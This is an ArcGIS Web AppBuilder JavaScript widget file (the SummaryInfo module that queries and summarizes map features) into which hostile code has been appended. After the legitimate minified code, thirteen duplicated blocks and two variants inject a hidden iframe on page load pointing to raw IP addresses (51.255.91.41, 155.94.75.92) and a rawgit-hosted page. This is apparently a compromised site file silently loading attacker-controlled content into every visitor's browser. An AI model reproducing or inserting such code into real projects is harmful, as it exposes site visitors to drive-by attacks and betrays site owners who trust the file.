// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.

define("dojo/_base/declare dojo/_base/array dojo/_base/lang dojo/_base/Color dojo/dom dojo/dom-class dojo/dom-construct dojo/dom-style dojo/number dojo/on dojo/has dijit/form/Button jimu/dijit/Popup jimu/CSVUtils jimu/utils esri/config esri/geometry/geometryEngine esri/geometry/mathUtils esri/geometry/Point esri/geometry/webMercatorUtils esri/graphic esri/layers/FeatureLayer esri/symbols/SimpleMarkerSymbol esri/symbols/SimpleLineSymbol esri/symbols/Font esri/symbols/TextSymbol esri/tasks/query".split(" "),
function(q,g,h,w,l,f,k,x,r,m,y,z,A,t,u,B,n,C,D,E,F,v,G,H,I,J,p){return q("SummaryInfo",null,{summaryLayer:null,summaryFields:[],summaryIds:[],summaryFeatures:[],constructor:function(a,b,c){this.tab=a;this.container=b;this.parent=c;this.config=c.config;this.buffer=this.incident=this.summaryLayer=null},updateForIncident:function(a,b){this.container.innerHTML="";f.add(this.container,"loading");this.incident=a;this.buffer=b;this.summaryIds=[];this.summaryFeatures=[];if(this.summaryLayer)this._queryFeatures(b.geometry);
else{var c=new v(this.tab.tabLayers[0].url);m(c,"load",h.hitch(this,function(){c.capabilities&&-1<c.capabilities.indexOf("Query")?(this.summaryLayer=c,this.summaryFields=this._getFields(this.summaryLayer),this._queryFeatures(b.geometry)):this._processError()}));m(this.parent.opLayers,"layerInfosFilterChanged",h.hitch(this,this._layerFilterChanged))}},_layerFilterChanged:function(a){if(null!==this.summaryLayer&&null!==this.incident&&null!==this.buffer){var b=this.tab.tabLayers[0].id;g.forEach(a,h.hitch(this,
function(a){b===a.id&&this.updateForIncident(this.incident,this.buffer)}))}},_queryFeatures:function(a){var b=this.tab.tabLayers[0].id,c="";this.parent.opLayers.traversal(function(a){if(b===a.id&&a.getFilter())return c=a.getFilter(),!0});var d=new p;d.geometry=a;d.where=c;this.summaryLayer.queryIds(d,h.hitch(this,function(a){a?(this.summaryIds=a,0<this.summaryIds.length?this._queryFeaturesByIds():this._processResults()):this._processResults()}))},_queryFeaturesByIds:function(){var a=this.summaryLayer.maxRecordCount||
1E3,b=this.summaryIds.slice(0,a);this.summaryIds.splice(0,a);var a=new p,c=!1;g.some(this.summaryFields,function(a){if("area"===a.type||"length"===a.type)return c=!0});a.returnGeometry=c;var d=[];g.forEach(this.summaryFields,function(a){d.push(a.field)});a.outFields=d;a.objectIds=b;this.summaryLayer.queryFeatures(a,h.hitch(this,function(a){this.summaryFeatures=this.summaryFeatures.concat(a.features);this._processResults();0<this.summaryIds.length?(l.byId("IMT_download")&&f.replace(l.byId("IMT_download"),
"processing","download"),setTimeout(h.hitch(this,this._queryFeaturesByIds),900)):l.byId("IMT_download")&&f.replace(l.byId("IMT_download"),"download","processing")}))},_prepResults:function(){for(var a=0;a<this.summaryFields.length;a++){var b=this.summaryFields[a],c=b.field,d=b.value;switch(b.type){case "count":d=this.summaryFeatures.length;break;case "area":d=this._getArea();break;case "length":d=this._getLength();break;case "sum":d=this._getSum(c);break;case "avg":d=this._getSum(c)/this.summaryFeatures.length;
break;case "min":d=this._getMin(c);break;case "max":d=this._getMax(c)}b.value=d}},_sortResults:function(a){return function(b,c){return b.attributes[a]<c.attributes[a]?-1:b.attributes[a]>c.attributes[a]?1:0}},_getSum:function(a){var b=0;g.forEach(this.summaryFeatures,function(c){b+=c.attributes[a]});return b},_getMin:function(a){this.summaryFeatures.sort(this._sortResults(a));return this.summaryFeatures[0].attributes[a]},_getMax:function(a){this.summaryFeatures.sort(this._sortResults(a));this.summaryFeatures.reverse();
return this.summaryFeatures[0].attributes[a]},_getArea:function(){var a=0,b=h.clone(this.config.distanceSettings);b.miles=109413;b.kilometers=109414;b.feet=109405;b.meters=109404;b.yards=109442;b.nauticalMiles=109409;var c=b[this.config.distanceUnits];g.forEach(this.summaryFeatures,function(b){a+=n.geodesicArea(b.geometry,c)});return a},_getLength:function(){var a=0,b=this.config.distanceSettings[this.config.distanceUnits];g.forEach(this.summaryFeatures,function(c){a+=n.geodesicLength(c.geometry,
b)});return a},_processError:function(){this.container.innerHTML="";f.remove(this.container,"loading");this.container.innerHTML=this.parent.nls.noFeaturesFound},_processResults:function(){this._prepResults();this.container.innerHTML="";f.remove(this.container,"loading");var a=this.summaryFields,b=0,c=k.create("div",{id:"tpc",style:"width:"+220*(a.length+1)+"px;"},this.container);f.add(c,"IMT_tabPanelContent");var d=k.create("div",{},c);f.add(d,"IMTcol");d=k.create("div",{id:"IMT_download",innerHTML:this.parent.nls.downloadCSV},
d);f.add(d,["btnExport","download"]);m(d,"click",h.hitch(this,this._exportToCSV));for(d=0;d<a.length;d++){var b=a[d],e=u.sanitizeHTML(b.alias?b.alias:"")+"\x3cbr/\x3e",b=b.alias===this.parent.nls.area||b.alias===this.parent.nls.length?b.value:Math.round(b.value);isNaN(b)&&(b=0);e+="\x3cdiv class\x3d'colSummary'\x3e"+r.format(b)+"\x3c/div\x3e\x3cbr/\x3e";e=k.create("div",{id:"Demographics_"+d,innerHTML:e},c);f.add(e,"IMTcol")}},_exportToCSV:function(){if(0===this.summaryFeatures.length)return!1;console.log(this.tab);
var a=this.tab.layers,b=[],c=[];g.forEach(this.summaryFeatures,function(a){b.push(a.attributes)});for(var d in b[0])c.push(d);t.exportCSV(a,b,c)},_getFields:function(a){var b=[];if(this.tab.advConfig&&this.tab.advConfig.fields&&0<this.tab.advConfig.fields.length)return g.forEach(this.tab.advConfig.fields,h.hitch(this,function(a){var c="";"count"!==a.type&&"area"!==a.type&&"length"!==a.type&&(c=" (\x3cspan style\x3d'font-size:7pt;'\x3e"+this.parent.nls[a.type]+"\x3c/span\x3e)");b.push({field:a.expression,
alias:a.label+c,type:a.type,value:0})})),b;var c;c=a.infoTemplate?a.infoTemplate.info.fieldInfos:a.fields;for(var d=0;d<c.length;d++){var e=c[d],f=e.fieldName||e.name,l=this._getFieldType(a.fields,f),k=null;f===a.objectIdField||"esriFieldTypeDouble"!==l&&"esriFieldTypeInteger"!==l&&"esriFieldTypeSmallInteger"!==l||("undefined"!==typeof e.visible?e.visible&&(k={field:e.fieldName,alias:e.label,type:"sum",value:0}):k={field:e.name,alias:e.alias,type:"sum",value:0},k&&b.push(k))}return b},_getFieldType:function(a,
b){var c;g.some(a,function(a){if(a.name===b)return c=a.type,!0});return c}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});